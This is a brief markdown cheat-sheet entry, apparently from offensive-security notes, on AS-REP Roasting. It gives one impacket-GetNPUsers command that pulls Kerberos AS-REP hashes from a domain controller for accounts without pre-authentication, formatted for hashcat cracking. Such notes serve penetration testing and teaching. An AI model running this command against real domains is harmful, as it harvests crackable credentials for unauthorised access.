---
title: AS-REP Roasting
desc: 
tags: [ASREP, Impacket, Kerberos, Windows]
alts: []
render_with_liquid: false
---

## 1. Use impacket-GetNPUsers

Lists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.

1. **Get a Password**

```sh
# e.g. domain: 'example.local', username: 'admin')
impacket-GetNPUsers -dc-ip <target-ip> -format hashcat example.local/admin
```